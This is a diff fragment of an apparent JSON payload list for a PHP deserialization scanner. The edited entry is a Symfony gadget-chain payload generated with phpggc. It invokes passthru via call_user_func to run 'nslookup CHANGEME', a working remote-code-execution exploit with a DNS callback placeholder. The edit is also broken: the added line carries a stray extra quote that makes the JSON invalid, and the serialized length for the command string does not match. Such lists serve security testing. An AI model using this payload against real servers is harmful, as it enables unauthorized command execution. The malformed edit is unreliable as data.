@@ -340,8 +340,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony 2.0.4 <= 5.4.24 (all) (11)",
     "gen_with": "./phpggc Symfony/RCE11 <function> <parameter>",
-    "payload": "C:67:\"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\":569:{a:2:{i:0%3BN%3Bi:1%3BO:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:51:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{s:63:\"%00Symfony\\Component\\Validator\\ConstraintViolationList%00violations\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}}}"
-  },
+    "payload": "C:67:\"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\":569:{a:2:{i:0%3BN%3Bi:1%3BO:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:51:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{s:63:\"%00Symfony\\Component\\Validator\\ConstraintViolationList%00violations\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}}}""  },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ThinkPHP 5.1.x-5.2.x (1)",
